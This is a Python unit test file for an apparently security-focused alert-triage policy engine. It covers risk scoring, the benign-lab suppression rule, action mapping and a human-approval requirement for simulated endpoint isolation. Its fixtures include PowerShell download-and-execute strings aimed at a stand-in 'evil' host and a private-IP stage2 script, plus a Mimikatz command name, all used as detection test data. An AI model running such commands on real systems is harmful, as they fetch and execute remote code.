"""Unit and integration tests for Milestone 3D deterministic risk and action policy engine.

Covers:
  - Trust boundary: PolicyContext separates untrusted alert evidence from trusted facts.
  - Benign lab rule: Exact conjunction of verified_detection_id, exact decoded command,
    and not incomplete_evidence. Model output cannot activate suppression.
  - Deterministic scoring: Explicit additive weights, bounded 0-100, threshold edges.
  - Confidence vs. Risk: Model confidence is separate and strictly additive (escalating only).
  - Action policy: Exact V1 mapping from risk level and evidence state to proposed actions.
  - Fail-closed incomplete evidence: Minimum HUMAN_REVIEW, blocks NO_ACTION/MONITOR.
  - Consequential action protection: SIMULATE_ENDPOINT_ISOLATION mandates human approval.
  - Schema validation & immutability: PolicyDecision and PolicyContext validation.
  - Security boundaries: No subprocess, no network, no secrets, no eval/exec.
  - Audit integration: POLICY_EVALUATED and APPROVAL_REQUIRED event emission.
  - Offline integration tests: Scenario A (benign lab) and Scenario B (suspicious encoded).
"""

import inspect
import tempfile
import unittest
from pathlib import Path
from typing import List, Tuple

from investigator.audit import AuditEvent, AuditEventType, AuditLog
from investigator.audit_writer import JsonlAuditWriter
from investigator.fake_model import FakeModel
from investigator.model import DecisionType, ModelDecision, ToolRequest
from investigator.orchestrator import InvestigationOrchestrator
from investigator.policy import (
    BENIGN_LAB_DETECTION_ID,
    EXACT_BENIGN_COMMAND,
    MAX_POLICY_REASONS,
    POLICY_REASON_CODES,
    ActionDisposition,
    PolicyContext,
    PolicyDecision,
    PolicyEngineError,
    ProposedAction,
    RiskLevel,
    RiskPolicyEngine,
)
from investigator.schemas import ConfidenceLevel, InvestigationInput, InvestigationResult
from investigator.tool_router import ToolRouter


def _make_alert(
    incident_id: str = "INC-3D-001",
    detection_name: str = "Suspicious Encoded PowerShell Execution",
    detection_id: str = "DET-POWERSHELL-001",
    command_line: str = "powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAQQBJAC0ATgBhAHQAaQB2AGUAUwBPAEMALQBMAEEAQgAtAFQARQBTAFQAJwA=",
) -> InvestigationInput:
    return InvestigationInput(
        incident_id=incident_id,
        timestamp="2026-09-17T08:00:00Z",
        host="DC01",
        user="SOCLAB\\Administrator",
        image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line=command_line,
        parent_image="C:\\Windows\\System32\\cmd.exe",
        parent_command_line="cmd.exe",
        detection_name=detection_name,
        detection_id=detection_id,
    )


def _make_result(
    confidence_level: str = "low",
    suspicious_indicators: Tuple[str, ...] = (),
    mitre_techniques: Tuple[str, ...] = ("T1059.001",),
    decoded_command: str = EXACT_BENIGN_COMMAND,
) -> InvestigationResult:
    return InvestigationResult(
        summary="Automated triage analysis summary.",
        observations=("Observed command execution",),
        decoded_command=decoded_command,
        mitre_techniques=mitre_techniques,
        suspicious_indicators=suspicious_indicators,
        recommended_next_step="Inspect execution context",
        confidence_level=confidence_level,
        evidence_refs=("DC01:Sysmon:1",),
    )


class TestPolicyContextTrustBoundary(unittest.TestCase):
    """Validation of PolicyContext trust boundaries."""

    def test_valid_policy_context_instantiation(self) -> None:
        alert = _make_alert()
        context = PolicyContext(
            alert=alert,
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command=EXACT_BENIGN_COMMAND,
            mitre_technique_id="T1059.001",
            tool_failure_or_incomplete_evidence=False,
        )
        self.assertEqual(context.verified_detection_id, BENIGN_LAB_DETECTION_ID)
        self.assertEqual(context.deterministic_decoded_command, EXACT_BENIGN_COMMAND)
        self.assertFalse(context.tool_failure_or_incomplete_evidence)

    def test_policy_context_is_immutable(self) -> None:
        alert = _make_alert()
        context = PolicyContext(
            alert=alert,
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
        )
        with self.assertRaises(Exception):
            context.verified_detection_id = "OTHER"  # type: ignore

    def test_invalid_alert_type_rejected(self) -> None:
        with self.assertRaises(PolicyEngineError):
            PolicyContext(
                alert="not_an_investigation_input",  # type: ignore
                verified_detection_id=BENIGN_LAB_DETECTION_ID,
            )

    def test_empty_verified_detection_id_rejected(self) -> None:
        alert = _make_alert()
        with self.assertRaises(PolicyEngineError):
            PolicyContext(alert=alert, verified_detection_id="")
        with self.assertRaises(PolicyEngineError):
            PolicyContext(alert=alert, verified_detection_id="   ")

    def test_invalid_tool_failure_type_rejected(self) -> None:
        alert = _make_alert()
        with self.assertRaises(PolicyEngineError):
            PolicyContext(
                alert=alert,
                verified_detection_id=BENIGN_LAB_DETECTION_ID,
                tool_failure_or_incomplete_evidence="true",  # type: ignore
            )


class TestBenignLabRuleConjunction(unittest.TestCase):
    """Rigorous verification of the exact benign-lab suppression rule."""

    def setUp(self) -> None:
        self.engine = RiskPolicyEngine()
        self.alert = _make_alert()

    def test_exact_benign_conjunction_triggers_suppression(self) -> None:
        """Verified detection ID + exact command + complete evidence -> LOW / NO_ACTION."""
        context = PolicyContext(
            alert=self.alert,
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command=EXACT_BENIGN_COMMAND,
            mitre_technique_id="T1059.001",
            tool_failure_or_incomplete_evidence=False,
        )
        decision = self.engine.evaluate(context)
        self.assertEqual(decision.risk_score, 0)
        self.assertEqual(decision.risk_level, RiskLevel.LOW)
        self.assertEqual(decision.proposed_action, ProposedAction.NO_ACTION)
        self.assertEqual(decision.action_disposition, ActionDisposition.NO_ACTION)
        self.assertFalse(decision.requires_human_approval)
        self.assertIn("benign_lab_fixture_matched", decision.reasons)

    def test_spoofed_detection_name_cannot_trigger_suppression(self) -> None:
        """alert.detection_name matches lab string, but verified_detection_id is unverified."""
        spoofed_alert = _make_alert(
            detection_name="Suspicious Encoded PowerShell Execution",
            detection_id="SPOOFED-NAME-ONLY",
        )
        context = PolicyContext(
            alert=spoofed_alert,
            verified_detection_id="UNKNOWN-DETECTION",
            deterministic_decoded_command=EXACT_BENIGN_COMMAND,
            tool_failure_or_incomplete_evidence=False,
        )
        decision = self.engine.evaluate(context)
        self.assertEqual(decision.proposed_action, ProposedAction.MONITOR)
        self.assertEqual(decision.action_disposition, ActionDisposition.MONITOR)
        self.assertNotIn("benign_lab_fixture_matched", decision.reasons)

    def test_spoofed_alert_detection_id_cannot_trigger_suppression(self) -> None:
        """alert.detection_id has benign string, but verified_detection_id does not."""
        alert = _make_alert(detection_id=BENIGN_LAB_DETECTION_ID)
        context = PolicyContext(
            alert=alert,
            verified_detection_id="OTHER-DETECTION-ID",
            deterministic_decoded_command=EXACT_BENIGN_COMMAND,
            tool_failure_or_incomplete_evidence=False,
        )
        decision = self.engine.evaluate(context)
        self.assertNotIn("benign_lab_fixture_matched", decision.reasons)

    def test_model_supplied_decoded_command_cannot_trigger_suppression(self) -> None:
        """Model claims decoded_command is benign, but deterministic decoder output is None."""
        context = PolicyContext(
            alert=self.alert,
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command=None,  # Not verified by deterministic tool
            tool_failure_or_incomplete_evidence=False,
        )
        # Model outputs benign string in advisory result
        result = _make_result(decoded_command=EXACT_BENIGN_COMMAND)
        decision = self.engine.evaluate(context, result)
        self.assertNotIn("benign_lab_fixture_matched", decision.reasons)
        self.assertGreater(decision.risk_score, 0)

    def test_embedded_benign_marker_does_not_trigger_suppression(self) -> None:
        """Chained command containing benign marker fails exact string equality."""
        malicious_chained = f"malicious-payload; {EXACT_BENIGN_COMMAND}"
        context = PolicyContext(
            alert=self.alert,
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command=malicious_chained,
            tool_failure_or_incomplete_evidence=False,
        )
        decision = self.engine.evaluate(context)
        self.assertNotIn("benign_lab_fixture_matched", decision.reasons)
        self.assertNotEqual(decision.proposed_action, ProposedAction.NO_ACTION)

    def test_similar_marker_does_not_trigger_suppression(self) -> None:
        """Similar string (e.g. LAB-PROD or LAB-TESTING) fails exact equality."""
        context = PolicyContext(
            alert=self.alert,
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command="Write-Host 'AI-NativeSOC-LAB-PROD'",
            tool_failure_or_incomplete_evidence=False,
        )
        decision = self.engine.evaluate(context)
        self.assertNotIn("benign_lab_fixture_matched", decision.reasons)

    def test_incomplete_evidence_flag_blocks_benign_suppression(self) -> None:
        """Exact benign command + verified ID, but tool_failure_or_incomplete_evidence=True."""
        context = PolicyContext(
            alert=self.alert,
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command=EXACT_BENIGN_COMMAND,
            tool_failure_or_incomplete_evidence=True,
        )
        decision = self.engine.evaluate(context)
        self.assertNotIn("benign_lab_fixture_matched", decision.reasons)
        self.assertIn("fail_closed_incomplete_evidence", decision.reasons)
        self.assertIn(decision.action_disposition, (ActionDisposition.HUMAN_REVIEW, ActionDisposition.APPROVAL_REQUIRED))


class TestDeterministicScoring(unittest.TestCase):
    """Verification of score calculation, additive weights, and bounds."""

    def setUp(self) -> None:
        self.engine = RiskPolicyEngine()
        self.alert = _make_alert()

    def test_score_deterministic_and_bounded(self) -> None:
        context = PolicyContext(
            alert=self.alert,
            verified_detection_id="OTHER",
            deterministic_decoded_command="Get-Process",
            mitre_technique_id="T1059.001",
        )
        res1 = self.engine.evaluate(context)
        res2 = self.engine.evaluate(context)
        self.assertEqual(res1.risk_score, res2.risk_score)
        self.assertTrue(0 <= res1.risk_score <= 100)

    def test_encoded_powershell_verified_detection_adds_25(self) -> None:
        context = PolicyContext(
            alert=self.alert,
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command=None,
        )
        decision = self.engine.evaluate(context)
        self.assertEqual(decision.risk_score, 25)
        self.assertIn("encoded_powershell_detected", decision.reasons)

    def test_decoded_command_adds_10(self) -> None:
        context = PolicyContext(
            alert=self.alert,
            verified_detection_id="OTHER",
            deterministic_decoded_command="dir C:\\",
        )
        decision = self.engine.evaluate(context)
        self.assertEqual(decision.risk_score, 10)
        self.assertIn("decoded_command_present", decision.reasons)

    def test_mitre_t1059_001_adds_10(self) -> None:
        context = PolicyContext(
            alert=self.alert,
            verified_detection_id="OTHER",
            mitre_technique_id="T1059.001",
        )
        decision = self.engine.evaluate(context)
        self.assertEqual(decision.risk_score, 10)
        self.assertIn("mitre_t1059_001", decision.reasons)

    def test_suspicious_indicators_scoring(self) -> None:
        context = PolicyContext(
            alert=self.alert,
            verified_detection_id="OTHER",
        )
        # Single indicator -> +20
        res_single = _make_result(suspicious_indicators=("encoded_flag",))
        dec_single = self.engine.evaluate(context, res_single)
        self.assertEqual(dec_single.risk_score, 20)
        self.assertIn("suspicious_indicators_present", dec_single.reasons)

        # Multiple indicators -> +20 + 5 = 25
        res_multi = _make_result(suspicious_indicators=("encoded_flag", "hidden_window"))
        dec_multi = self.engine.evaluate(context, res_multi)
        self.assertEqual(dec_multi.risk_score, 25)
        self.assertIn("multiple_suspicious_indicators", dec_multi.reasons)

    def test_confidence_scoring_strictly_additive(self) -> None:
        context = PolicyContext(alert=self.alert, verified_detection_id="OTHER")

        # Low confidence -> +0
        dec_low = self.engine.evaluate(context, _make_result(confidence_level="low"))
        self.assertEqual(dec_low.risk_score, 0)

        # Medium confidence -> +5
        dec_med = self.engine.evaluate(context, _make_result(confidence_level="medium"))
        self.assertEqual(dec_med.risk_score, 5)
        self.assertIn("model_confidence_medium", dec_med.reasons)

        # High confidence -> +10
        dec_high = self.engine.evaluate(context, _make_result(confidence_level="high"))
        self.assertEqual(dec_high.risk_score, 10)
        self.assertIn("model_confidence_high", dec_high.reasons)

    def test_score_capped_at_100(self) -> None:
        """All signals together cannot exceed 100."""
        context = PolicyContext(
            alert=self.alert,
            verified_detection_id=BENIGN_LAB_DETECTION_ID,  # 25
            deterministic_decoded_command="Invoke-Mimikatz",  # 10
            mitre_technique_id="T1059.001",  # 10
            tool_failure_or_incomplete_evidence=True,  # 15
        )
        # Total from context: 60
        # Result: suspicious indicators (25) + high confidence (10) = 35 -> Total: 95
        result = _make_result(
            confidence_level="high",
            suspicious_indicators=("ind1", "ind2", "ind3"),
        )
        decision = self.engine.evaluate(context, result)
        self.assertTrue(decision.risk_score <= 100)
        self.assertEqual(decision.risk_score, 95)


class TestThresholdsAndActionMapping(unittest.TestCase):
    """Verification of risk level thresholds and exact V1 action mapping."""

    def test_low_non_benign_maps_to_monitor(self) -> None:
        decision = PolicyDecision(
            risk_score=15,
            risk_level=RiskLevel.LOW,
            action_disposition=ActionDisposition.MONITOR,
            proposed_action=ProposedAction.MONITOR,
            reasons=("decoded_command_present",),
            requires_human_approval=False,
        )
        self.assertEqual(decision.risk_level, RiskLevel.LOW)
        self.assertEqual(decision.proposed_action, ProposedAction.MONITOR)
        self.assertEqual(decision.action_disposition, ActionDisposition.MONITOR)
        self.assertFalse(decision.requires_human_approval)

    def test_medium_maps_to_human_review(self) -> None:
        engine = RiskPolicyEngine()
        context = PolicyContext(
            alert=_make_alert(),
            verified_detection_id=BENIGN_LAB_DETECTION_ID,  # 25 -> MEDIUM
        )
        decision = engine.evaluate(context)
        self.assertEqual(decision.risk_level, RiskLevel.MEDIUM)
        self.assertEqual(decision.proposed_action, ProposedAction.REQUEST_HUMAN_REVIEW)
        self.assertEqual(decision.action_disposition, ActionDisposition.HUMAN_REVIEW)
        self.assertFalse(decision.requires_human_approval)

    def test_high_maps_to_create_incident_record(self) -> None:
        engine = RiskPolicyEngine()
        context = PolicyContext(
            alert=_make_alert(),
            verified_detection_id=BENIGN_LAB_DETECTION_ID,  # 25
            deterministic_decoded_command="dir",  # 10
            mitre_technique_id="T1059.001",  # 10
        )
        result = _make_result(suspicious_indicators=("suspicious_arg",))  # 20 -> total 65 (HIGH)
        decision = engine.evaluate(context, result)
        self.assertEqual(decision.risk_level, RiskLevel.HIGH)
        self.assertEqual(decision.proposed_action, ProposedAction.CREATE_INCIDENT_RECORD)
        self.assertEqual(decision.action_disposition, ActionDisposition.HUMAN_REVIEW)
        self.assertFalse(decision.requires_human_approval)

    def test_critical_maps_to_simulate_endpoint_isolation(self) -> None:
        engine = RiskPolicyEngine()
        context = PolicyContext(
            alert=_make_alert(),
            verified_detection_id=BENIGN_LAB_DETECTION_ID,  # 25
            deterministic_decoded_command="IEX (New-Object Net.WebClient).DownloadString('http://evil')",  # 10
            mitre_technique_id="T1059.001",  # 10
        )
        # 45 + 25 (multi indicators) + 10 (high confidence) = 80 -> CRITICAL
        result = _make_result(
            confidence_level="high",
            suspicious_indicators=("download_c2", "hidden_window"),
        )
        decision = engine.evaluate(context, result)
        self.assertEqual(decision.risk_level, RiskLevel.CRITICAL)
        self.assertEqual(decision.proposed_action, ProposedAction.SIMULATE_ENDPOINT_ISOLATION)
        self.assertEqual(decision.action_disposition, ActionDisposition.APPROVAL_REQUIRED)
        self.assertTrue(decision.requires_human_approval)
        self.assertIn("approval_required_for_consequential_action", decision.reasons)

    def test_consequential_action_without_approval_fails_closed(self) -> None:
        """Invariant: SIMULATE_ENDPOINT_ISOLATION without requires_human_approval raises PolicyEngineError."""
        with self.assertRaises(PolicyEngineError):
            PolicyDecision(
                risk_score=90,
                risk_level=RiskLevel.CRITICAL,
                action_disposition=ActionDisposition.APPROVAL_REQUIRED,
                proposed_action=ProposedAction.SIMULATE_ENDPOINT_ISOLATION,
                reasons=("approval_required_for_consequential_action",),
                requires_human_approval=False,  # Forbidden
            )

    def test_consequential_action_with_wrong_disposition_fails_closed(self) -> None:
        """Invariant: SIMULATE_ENDPOINT_ISOLATION with disposition != APPROVAL_REQUIRED raises error."""
        with self.assertRaises(PolicyEngineError):
            PolicyDecision(
                risk_score=90,
                risk_level=RiskLevel.CRITICAL,
                action_disposition=ActionDisposition.NO_ACTION,  # Forbidden
                proposed_action=ProposedAction.SIMULATE_ENDPOINT_ISOLATION,
                reasons=("approval_required_for_consequential_action",),
                requires_human_approval=True,
            )


class TestFailClosedIncompleteEvidence(unittest.TestCase):
    """Verification that incomplete/tool-failure states fail closed to HUMAN_REVIEW."""

    def setUp(self) -> None:
        self.engine = RiskPolicyEngine()

    def test_incomplete_evidence_prevents_no_action_and_monitor(self) -> None:
        context = PolicyContext(
            alert=_make_alert(),
            verified_detection_id="UNKNOWN",  # 0
            tool_failure_or_incomplete_evidence=True,  # +15 uncertainty
        )
        # Score is 15 (LOW), but incomplete evidence must force HUMAN_REVIEW
        decision = self.engine.evaluate(context)
        self.assertEqual(decision.risk_score, 15)
        self.assertEqual(decision.risk_level, RiskLevel.LOW)
        self.assertEqual(decision.proposed_action, ProposedAction.REQUEST_HUMAN_REVIEW)
        self.assertEqual(decision.action_disposition, ActionDisposition.HUMAN_REVIEW)
        self.assertIn("fail_closed_incomplete_evidence", decision.reasons)

    def test_malformed_context_raises_policy_engine_error(self) -> None:
        with self.assertRaises(PolicyEngineError):
            self.engine.evaluate({"not": "context"})  # type: ignore

    def test_malformed_result_raises_policy_engine_error(self) -> None:
        context = PolicyContext(alert=_make_alert(), verified_detection_id="DET-001")
        with self.assertRaises(PolicyEngineError):
            self.engine.evaluate(context, {"not": "result"})  # type: ignore


class TestPolicyDecisionValidation(unittest.TestCase):
    """Schema validation for PolicyDecision."""

    def test_bool_risk_score_rejected(self) -> None:
        with self.assertRaises(PolicyEngineError):
            PolicyDecision(
                risk_score=True,  # type: ignore
                risk_level=RiskLevel.LOW,
                action_disposition=ActionDisposition.MONITOR,
                proposed_action=ProposedAction.MONITOR,
                reasons=("encoded_powershell_detected",),
                requires_human_approval=False,
            )

    def test_out_of_bounds_risk_score_rejected(self) -> None:
        with self.assertRaises(PolicyEngineError):
            PolicyDecision(
                risk_score=-1,
                risk_level=RiskLevel.LOW,
                action_disposition=ActionDisposition.MONITOR,
                proposed_action=ProposedAction.MONITOR,
                reasons=("encoded_powershell_detected",),
                requires_human_approval=False,
            )
        with self.assertRaises(PolicyEngineError):
            PolicyDecision(
                risk_score=101,
                risk_level=RiskLevel.CRITICAL,
                action_disposition=ActionDisposition.APPROVAL_REQUIRED,
                proposed_action=ProposedAction.SIMULATE_ENDPOINT_ISOLATION,
                reasons=("approval_required_for_consequential_action",),
                requires_human_approval=True,
            )

    def test_reasons_normalized_to_tuple(self) -> None:
        decision = PolicyDecision(
            risk_score=10,
            risk_level=RiskLevel.LOW,
            action_disposition=ActionDisposition.MONITOR,
            proposed_action=ProposedAction.MONITOR,
            reasons=["encoded_powershell_detected", "decoded_command_present"],  # type: ignore
            requires_human_approval=False,
        )
        self.assertIsInstance(decision.reasons, tuple)
        self.assertEqual(decision.reasons, ("encoded_powershell_detected", "decoded_command_present"))

    def test_reasons_with_control_chars_rejected(self) -> None:
        with self.assertRaises(PolicyEngineError):
            PolicyDecision(
                risk_score=10,
                risk_level=RiskLevel.LOW,
                action_disposition=ActionDisposition.MONITOR,
                proposed_action=ProposedAction.MONITOR,
                reasons=("encoded_powershell_detected\ninjection",),
                requires_human_approval=False,
            )

    def test_unknown_reason_code_rejected(self) -> None:
        """Regression test: reason codes outside POLICY_REASON_CODES must fail closed."""
        with self.assertRaises(PolicyEngineError) as ctx:
            PolicyDecision(
                risk_score=10,
                risk_level=RiskLevel.LOW,
                action_disposition=ActionDisposition.MONITOR,
                proposed_action=ProposedAction.MONITOR,
                reasons=("arbitrary_caller_or_model_prose",),
                requires_human_approval=False,
            )
        self.assertIn("Unknown policy reason code", str(ctx.exception))

    def test_oversized_reason_collection_rejected(self) -> None:
        """Regression test: reason collection exceeding MAX_POLICY_REASONS must fail closed."""
        oversized = tuple("encoded_powershell_detected" for _ in range(MAX_POLICY_REASONS + 1))
        with self.assertRaises(PolicyEngineError) as ctx:
            PolicyDecision(
                risk_score=10,
                risk_level=RiskLevel.LOW,
                action_disposition=ActionDisposition.MONITOR,
                proposed_action=ProposedAction.MONITOR,
                reasons=oversized,
                requires_human_approval=False,
            )
        self.assertIn("exceeds maximum", str(ctx.exception))

    def test_all_engine_generated_reasons_in_allowlist(self) -> None:
        """Verify that every engine scenario produces strictly allowlisted reason codes."""
        engine = RiskPolicyEngine()
        # Test benign scenario
        ctx_benign = PolicyContext(
            alert=_make_alert(),
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command=EXACT_BENIGN_COMMAND,
        )
        dec_benign = engine.evaluate(ctx_benign)
        for r in dec_benign.reasons:
            self.assertIn(r, POLICY_REASON_CODES)

        # Test suspicious scenario
        ctx_suspicious = PolicyContext(
            alert=_make_alert(),
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command="payload",
            mitre_technique_id="T1059.001",
            tool_failure_or_incomplete_evidence=True,
        )
        res_suspicious = _make_result(
            confidence_level="high",
            suspicious_indicators=("ind1", "ind2"),
        )
        dec_suspicious = engine.evaluate(ctx_suspicious, res_suspicious)
        for r in dec_suspicious.reasons:
            self.assertIn(r, POLICY_REASON_CODES)


class TestPolicySecurityBoundaries(unittest.TestCase):
    """Verify security isolation in investigator/policy.py."""

    def test_no_subprocess_or_shell_imported(self) -> None:
        import investigator.policy as mod
        source = inspect.getsource(mod)
        self.assertNotIn("import subprocess", source)
        self.assertNotIn("from subprocess", source)
        self.assertNotIn("os.system", source)
        self.assertNotIn("os.popen", source)
        self.assertNotIn("import commands", source)

    def test_no_network_or_socket_imported(self) -> None:
        import investigator.policy as mod
        source = inspect.getsource(mod)
        self.assertNotIn("import socket", source)
        self.assertNotIn("import urllib", source)
        self.assertNotIn("import requests", source)
        self.assertNotIn("import http", source)

    def test_no_openai_api_key_accessed(self) -> None:
        import investigator.policy as mod
        source = inspect.getsource(mod)
        self.assertNotIn("OPENAI_API_KEY", source)
        self.assertNotIn("OPENAI_MODEL", source)

    def test_gateway_not_imported(self) -> None:
        import investigator.policy as mod
        source = inspect.getsource(mod)
        self.assertNotIn("gateway", source)


class TestPolicyAuditIntegration(unittest.TestCase):
    """Verify audit logging integration with AuditLog and JsonlAuditWriter."""

    def test_policy_decision_records_audit_events(self) -> None:
        engine = RiskPolicyEngine()
        audit_log = AuditLog()
        context = PolicyContext(
            alert=_make_alert(),
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command=EXACT_BENIGN_COMMAND,
            tool_failure_or_incomplete_evidence=False,
        )
        decision = engine.evaluate(context, audit_log=audit_log)
        events = audit_log.events()
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].event_type, AuditEventType.POLICY_EVALUATED)
        self.assertEqual(events[0].detail_code, "benign_lab_rule_applied")

    def test_critical_decision_records_approval_required_audit(self) -> None:
        engine = RiskPolicyEngine()
        audit_log = AuditLog()
        context = PolicyContext(
            alert=_make_alert(),
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command="IEX payload",
            mitre_technique_id="T1059.001",
        )
        result = _make_result(
            confidence_level="high",
            suspicious_indicators=("indicator1", "indicator2"),
        )
        decision = engine.evaluate(context, result, audit_log=audit_log)
        events = audit_log.events()
        self.assertEqual(len(events), 2)
        self.assertEqual(events[0].event_type, AuditEventType.POLICY_EVALUATED)
        self.assertEqual(events[0].detail_code, "risk_critical")
        self.assertEqual(events[1].event_type, AuditEventType.APPROVAL_REQUIRED)
        self.assertEqual(events[1].detail_code, "approval_required")

    def test_audit_events_persisted_to_jsonl_cleanly(self) -> None:
        """Verify JsonlAuditWriter accepts new policy audit event types without schema changes."""
        engine = RiskPolicyEngine()
        audit_log = AuditLog()
        context = PolicyContext(
            alert=_make_alert(),
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command="IEX payload",
            mitre_technique_id="T1059.001",
        )
        result = _make_result(confidence_level="high", suspicious_indicators=("ind1", "ind2"))
        engine.evaluate(context, result, audit_log=audit_log)

        with tempfile.TemporaryDirectory() as td:
            log_path = Path(td) / "test_policy_audit.jsonl"
            writer = JsonlAuditWriter(log_path)
            writer.write_events(audit_log.events())

            lines = log_path.read_text(encoding="utf-8").splitlines()
            self.assertEqual(len(lines), 2)
            self.assertIn('"event_type":"POLICY_EVALUATED"', lines[0])
            self.assertIn('"event_type":"APPROVAL_REQUIRED"', lines[1])


class TestOfflinePolicyIntegrationScenarios(unittest.TestCase):
    """End-to-end integration tests connecting FakeModel, Orchestrator, and RiskPolicyEngine."""

    def setUp(self) -> None:
        self.router = ToolRouter()
        self.engine = RiskPolicyEngine()

    def test_scenario_a_benign_lab_pipeline(self) -> None:
        """Scenario A: Controlled benign lab investigation -> LOW / NO_ACTION."""
        # 1. Benign FakeModel
        final_res = InvestigationResult(
            summary="Controlled benign encoded PowerShell test verified.",
            observations=("Decoded Write-Host benign marker",),
            decoded_command=EXACT_BENIGN_COMMAND,
            mitre_techniques=("T1059.001",),
            suspicious_indicators=(),
            recommended_next_step="Close incident as controlled test.",
            confidence_level="low",
            evidence_refs=("DC01:Sysmon:1",),
        )
        fake_model = FakeModel(
            decisions=[
                ModelDecision(
                    decision_type=DecisionType.TOOL_REQUEST,
                    tool_request=ToolRequest(
                        tool_name="decode_base64_powershell",
                        arguments={"encoded_input": "VwByAGkAdABlAC0ASABvAHMAdAAgACcAQQBJAC0ATgBhAHQAaQB2AGUAUwBPAEMALQBMAEEAQgAtAFQARQBTAFQAJwA="},
                    ),
                ),
                ModelDecision(
                    decision_type=DecisionType.FINAL_RESULT,
                    final_result=final_res,
                ),
            ]
        )

        # 2. Orchestration
        audit_log = AuditLog()
        orchestrator = InvestigationOrchestrator(
            model=fake_model,
            tool_router=self.router,
            audit_log=audit_log,
        )
        alert = _make_alert()
        inv_result = orchestrator.investigate(alert)

        # 3. Policy evaluation using verified detection ID and deterministic decoder output
        decode_result = self.router.execute_tool(
            "decode_base64_powershell",
            {"encoded_input": "VwByAGkAdABlAC0ASABvAHMAdAAgACcAQQBJAC0ATgBhAHQAaQB2AGUAUwBPAEMALQBMAEEAQgAtAFQARQBTAFQAJwA="},
        )
        context = PolicyContext(
            alert=alert,
            verified_detection_id=BENIGN_LAB_DETECTION_ID,
            deterministic_decoded_command=decode_result.decoded_text,
            mitre_technique_id="T1059.001",
            tool_failure_or_incomplete_evidence=False,
        )

        decision = self.engine.evaluate(context, inv_result, audit_log=audit_log)

        # 4. Assertions
        self.assertEqual(decision.risk_score, 0)
        self.assertEqual(decision.risk_level, RiskLevel.LOW)
        self.assertEqual(decision.proposed_action, ProposedAction.NO_ACTION)
        self.assertEqual(decision.action_disposition, ActionDisposition.NO_ACTION)
        self.assertFalse(decision.requires_human_approval)

    def test_scenario_b_suspicious_pipeline(self) -> None:
        """Scenario B: Malicious/suspicious pipeline -> CRITICAL / SIMULATE_ENDPOINT_ISOLATION."""
        # 1. Suspicious FakeModel
        final_res = InvestigationResult(
            summary="High confidence malicious execution detected with C2 download.",
            observations=("Encoded download string detected",),
            decoded_command="IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/stage2.ps1')",
            mitre_techniques=("T1059.001",),
            suspicious_indicators=("untrusted_download", "powershell_execution"),
            recommended_next_step="Isolate endpoint immediately.",
            confidence_level="high",
            evidence_refs=("DC01:Sysmon:1",),
        )
        fake_model = FakeModel(
            decisions=[
                ModelDecision(
                    decision_type=DecisionType.FINAL_RESULT,
                    final_result=final_res,
                ),
            ]
        )

        audit_log = AuditLog()
        orchestrator = InvestigationOrchestrator(
            model=fake_model,
            tool_router=self.router,
            audit_log=audit_log,
        )
        alert = _make_alert()
        inv_result = orchestrator.investigate(alert)

        # 2. Policy evaluation
        context = PolicyContext(
            alert=alert,
            verified_detection_id=BENIGN_LAB_DETECTION_ID,  # 25
            deterministic_decoded_command="IEX DownloadString",  # 10
            mitre_technique_id="T1059.001",  # 10
            tool_failure_or_incomplete_evidence=False,
        )
        # Context (45) + Suspicious indicators (25) + High confidence (10) = 80 (CRITICAL)
        decision = self.engine.evaluate(context, inv_result, audit_log=audit_log)

        # 3. Assertions
        self.assertEqual(decision.risk_score, 80)
        self.assertEqual(decision.risk_level, RiskLevel.CRITICAL)
        self.assertEqual(decision.proposed_action, ProposedAction.SIMULATE_ENDPOINT_ISOLATION)
        self.assertEqual(decision.action_disposition, ActionDisposition.APPROVAL_REQUIRED)
        self.assertTrue(decision.requires_human_approval)


if __name__ == "__main__":
    unittest.main()
